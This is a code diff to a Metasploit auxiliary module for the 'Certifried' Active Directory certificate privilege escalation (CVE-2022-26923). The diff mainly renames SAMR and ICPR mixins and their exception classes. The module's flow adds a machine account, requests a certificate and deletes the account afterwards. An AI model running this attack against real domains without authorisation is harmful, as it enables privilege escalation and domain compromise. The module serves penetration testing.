@@ -7,8 +7,8 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Exploit::Remote::LDAP
   include Msf::Auxiliary::Report
-  include Msf::Exploit::Remote::MsAdcs
-  include Msf::Exploit::Remote::SamrComputer
+  include Msf::Exploit::Remote::MsIcpr
+  include Msf::Exploit::Remote::MsSamr
 
   def initialize(info = {})
     super(
@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html'],
         ],
         'Notes' => {
+          'AKA' => [ 'Certifried' ],
           'Reliability' => [CRASH_SAFE],
           'Stability' => [],
           'SideEffects' => [ IOC_IN_LOGS ]
@@ -63,13 +64,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    opts = {}
     validate_options
-
     unless can_add_computer?
       fail_with(Failure::NoAccess, 'Machine account quota is zero, this user cannot create a computer account')
     end
 
-    opts = {}
     opts[:tree] = connect_smb
     computer_info = add_computer(opts)
     disconnect_smb(opts.delete(:tree))
@@ -82,17 +82,17 @@ class MetasploitModule < Msf::Auxiliary
     }
     opts[:tree] = connect_smb(opts)
     request_certificate(opts)
-  rescue SamrComputerConnectionError, MsAdcsConnectionError => e
+  rescue MsSamrConnectionError, MsIcprConnectionError => e
     fail_with(Failure::Unreachable, e.message)
-  rescue SamrComputerAuthentcationError, MsAdcsAuthentcationError => e
+  rescue MsSamrAuthentcationError, MsIcprAuthentcationError => e
     fail_with(Failure::NoAccess, e.message)
-  rescue SamrComputerNotFoundError, MsAdcsNotFoundError => e
+  rescue MsSamrNotFoundError, MsIcprNotFoundError => e
     fail_with(Failure::NotFound, e.message)
-  rescue SamrComputerBadConfigError => e
+  rescue MsSamrBadConfigError => e
     fail_with(Failure::BadConfig, e.message)
-  rescue SamrComputerUnexpectedReplyError, MsAdcsUnexpectedReplyError => e
+  rescue MsSamrUnexpectedReplyError, MsIcprUnexpectedReplyError => e
     fail_with(Failure::UnexpectedReply, e.message)
-  rescue SamrComputerUnknownError, MsAdcsUnknownError => e
+  rescue MsSamrUnknownError, MsIcprUnknownError => e
     fail_with(Failure::Unknown, e.message)
   ensure
     disconnect_smb(opts.delete(:tree)) if opts[:tree]
@@ -102,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
     }
     begin
       delete_computer(opts) if opts[:tree] && opts[:computer_name]
-    rescue SamrComputerUnknownError => e
+    rescue MsSamrUnknownError => e
       print_warning("Unable to delete the computer account, this will have to be done manually with an Administrator account (#{e.message})")
     end
     disconnect_smb(opts.delete(:tree)) if opts[:tree]
@@ -126,10 +126,7 @@ class MetasploitModule < Msf::Auxiliary
     domain = opts[:domain] || datastore['SMBDomain']
     vprint_status("Connecting SMB with #{username}.#{domain}:#{password}")
     begin
-      ssl_option_bak = datastore['SSL']
-      datastore['SSL'] = false
       connect
-      datastore['SSL'] = ssl_option_bak
     rescue Rex::ConnectionError, RubySMB::Error::RubySMBError => e
       fail_with(Failure::Unreachable, e.message)
     end
